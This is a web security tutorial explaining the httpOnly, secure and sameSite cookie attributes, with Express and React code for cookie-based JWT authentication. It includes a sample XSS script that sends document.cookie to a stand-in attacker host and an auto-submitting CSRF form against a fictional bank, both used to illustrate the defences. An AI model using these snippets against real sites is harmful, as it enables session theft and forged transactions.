---

title: "HttpOnly, Secure, and SameSite Cookies Explained with Real Auth Example"
author: "Nihesh Rachakonda"
date: "2026-01-06"
dateModified: "2026-01-06"
tags: ["cookies", "security", "authentication", "web-security", "xss", "csrf"]
excerpt: "Deep dive into cookie security attributes with a practical authentication implementation example"
---

Cookies are fundamental to web authentication, but improper configuration can expose your application to serious security vulnerabilities. This guide explains the three critical cookie security attributes—httpOnly, secure, and sameSite—with a real-world authentication example.

## Understanding Cookie Security Attributes

Modern web applications face threats like Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF). Cookie security attributes are your first line of defense against these attacks.

### The Three Essential Attributes

- **httpOnly**: Prevents JavaScript from accessing cookies
- **secure**: Ensures cookies are only sent over HTTPS
- **sameSite**: Controls when cookies are sent with cross-site requests

## HttpOnly: Protecting Against XSS Attacks

The httpOnly attribute prevents client-side JavaScript from accessing cookies through `document.cookie`. This is crucial for protecting sensitive tokens like session IDs.

### Without HttpOnly (Vulnerable)

```javascript
// Attacker's malicious script injected via XSS
const stolenToken = document.cookie;
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});
```

If your authentication cookie lacks httpOnly, an attacker who successfully injects JavaScript can steal it immediately.

### With HttpOnly (Protected)

```javascript
// Server-side: Node.js/Express example
res.cookie('authToken', token, {
  httpOnly: true,  // JavaScript cannot access this cookie
  maxAge: 24 * 60 * 60 * 1000 // 24 hours
});
```

Now even if an attacker injects malicious JavaScript, `document.cookie` won’t reveal the authentication token.

## Secure: HTTPS-Only Transmission

The secure attribute ensures cookies are only transmitted over encrypted HTTPS connections, preventing man-in-the-middle attacks.

### The Risk Without Secure

If a user connects over HTTP (even accidentally), cookies without the secure flag are transmitted in plain text. An attacker on the same network can intercept them.

### Implementation

```javascript
res.cookie('authToken', token, {
  httpOnly: true,
  secure: true,  // Only sent over HTTPS
  maxAge: 24 * 60 * 60 * 1000
});
```

**Important**: In development, you might use HTTP. Handle this conditionally:

```javascript
res.cookie('authToken', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  maxAge: 24 * 60 * 60 * 1000
});
```

## SameSite: CSRF Protection

The sameSite attribute controls whether cookies are sent with cross-site requests, protecting against CSRF attacks.

### SameSite Values

- **Strict**: Cookie is never sent on cross-site requests
- **Lax**: Cookie is sent only on top-level navigation with safe HTTP methods (GET)
- **None**: Cookie is always sent (requires secure attribute)

### Understanding CSRF

Imagine a user is logged into `yourbank.com`. They visit `evil.com`, which contains:

```html
<form action="https://yourbank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker-account">
</form>
<script>document.forms[0].submit();</script>
```

Without sameSite protection, the browser automatically includes the authentication cookie with this malicious request.

### Protection with SameSite

```javascript
res.cookie('authToken', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',  // Blocks cross-site requests entirely
  maxAge: 24 * 60 * 60 * 1000
});
```

### Choosing the Right SameSite Value

**Use Strict when**: You want maximum security and your application doesn’t need cookies on cross-site navigation (like internal dashboards).

**Use Lax when**: You need cookies on initial navigation from external sites (common for most web applications). This is the default in modern browsers.

**Use None when**: You need cookies in cross-site contexts (like embedded iframes or third-party integrations). Must be combined with secure.

## Real-World Authentication Example

Let’s build a complete authentication system with properly configured cookies.

### Backend: Express.js Authentication

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
const cookieParser = require('cookie-parser');

const app = express();
app.use(express.json());
app.use(cookieParser());

const JWT_SECRET = process.env.JWT_SECRET;
const REFRESH_SECRET = process.env.REFRESH_SECRET;

// Login endpoint
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Validate credentials (simplified)
  const user = await User.findOne({ email });
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate tokens
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email },
    JWT_SECRET,
    { expiresIn: '15m' }
  );
  
  const refreshToken = jwt.sign(
    { userId: user.id },
    REFRESH_SECRET,
    { expiresIn: '7d' }
  );
  
  // Set secure cookies
  res.cookie('accessToken', accessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000 // 15 minutes
  });
  
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });
  
  res.json({ 
    success: true,
    user: { id: user.id, email: user.email }
  });
});

// Protected route middleware
const authenticate = (req, res, next) => {
  const token = req.cookies.accessToken;
  
  if (!token) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
};

// Token refresh endpoint
app.post('/api/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    const decoded = jwt.verify(refreshToken, REFRESH_SECRET);
    
    // Generate new access token
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      JWT_SECRET,
      { expiresIn: '15m' }
    );
    
    res.cookie('accessToken', newAccessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000
    });
    
    res.json({ success: true });
  } catch (error) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
});

// Logout endpoint
app.post('/api/auth/logout', (req, res) => {
  res.clearCookie('accessToken');
  res.clearCookie('refreshToken');
  res.json({ success: true });
});

// Protected route example
app.get('/api/user/profile', authenticate, (req, res) => {
  res.json({ user: req.user });
});

app.listen(3000, () => console.log('Server running on port 3000'));
```

### Frontend: React Authentication

```javascript
import { useState } from 'react';

function LoginForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const handleLogin = async (e) => {
    e.preventDefault();
    
    try {
      const response = await fetch('http://localhost:3000/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include', // Important: sends cookies
        body: JSON.stringify({ email, password })
      });
      
      if (!response.ok) {
        throw new Error('Login failed');
      }
      
      const data = await response.json();
      console.log('Logged in successfully:', data.user);
      // Redirect to dashboard
      
    } catch (err) {
      setError(err.message);
    }
  };

  return (
    <form onSubmit={handleLogin}>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        placeholder="Email"
        required
      />
      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        placeholder="Password"
        required
      />
      <button type="submit">Login</button>
      {error && <p className="error">{error}</p>}
    </form>
  );
}

// API utility with automatic token refresh
async function authenticatedFetch(url, options = {}) {
  const response = await fetch(url, {
    ...options,
    credentials: 'include'
  });
  
  if (response.status === 401) {
    // Try to refresh token
    const refreshResponse = await fetch('http://localhost:3000/api/auth/refresh', {
      method: 'POST',
      credentials: 'include'
    });
    
    if (refreshResponse.ok) {
      // Retry original request
      return fetch(url, {
        ...options,
        credentials: 'include'
      });
    }
    
    // Refresh failed, redirect to login
    window.location.href = '/login';
    throw new Error('Authentication failed');
  }
  
  return response;
}

// Usage example
function UserProfile() {
  const [profile, setProfile] = useState(null);
  
  useEffect(() => {
    authenticatedFetch('http://localhost:3000/api/user/profile')
      .then(res => res.json())
      .then(data => setProfile(data.user))
      .catch(err => console.error(err));
  }, []);
  
  return profile ? <div>Welcome, {profile.email}</div> : <div>Loading...</div>;
}
```

## CORS Configuration for Cookie-Based Auth

When using cookies with a separate frontend and backend, configure CORS properly:

```javascript
const cors = require('cors');

app.use(cors({
  origin: 'http://localhost:5173', // Your frontend URL
  credentials: true // Allow cookies
}));
```

## Common Pitfalls and Solutions

### Issue: Cookies Not Being Set

**Problem**: Frontend doesn’t receive cookies after login.

**Solution**: Ensure you’re using `credentials: 'include'` in fetch requests and have proper CORS configuration.

### Issue: Cookies Not Sent with Requests

**Problem**: Authenticated requests fail even after login.

**Solution**: Always include `credentials: 'include'` in fetch options and verify sameSite compatibility.

### Issue: SameSite Strict Blocking Legitimate Requests

**Problem**: Users redirected from external sites (like email links) lose authentication.

**Solution**: Use `sameSite: 'lax'` instead of strict, or implement a hybrid approach with different cookies for different purposes.

## Security Best Practices Checklist

- Always use all three attributes together for authentication cookies
- Keep access tokens short-lived (15 minutes or less)
- Use refresh tokens for extended sessions
- Implement token rotation on refresh
- Clear cookies on logout
- Use HTTPS in production (required for secure attribute)
- Consider additional CSRF tokens for state-changing operations
- Regularly rotate signing secrets
- Monitor for suspicious authentication patterns
- Implement rate limiting on authentication endpoints

## Testing Cookie Security

Test your cookie configuration using browser DevTools:

1. Open DevTools (F12)
1. Navigate to Application tab
1. Find Cookies in the sidebar
1. Verify attributes are set correctly
1. Try accessing cookies via console with `document.cookie`

If httpOnly is properly configured, your authentication cookies won’t appear in the console output.

## Conclusion

Cookie security attributes are not optional—they’re essential for protecting user sessions and preventing common web vulnerabilities. By combining httpOnly, secure, and sameSite attributes, you create multiple layers of defense against XSS and CSRF attacks.

Remember that cookie security is just one part of a comprehensive security strategy. Always validate input, sanitize output, use parameterized queries, keep dependencies updated, and follow security best practices throughout your application.

Implement these patterns consistently, and you’ll significantly reduce your application’s attack surface while providing a secure authentication experience for your users.​​​​​​​​​​​​​​​​
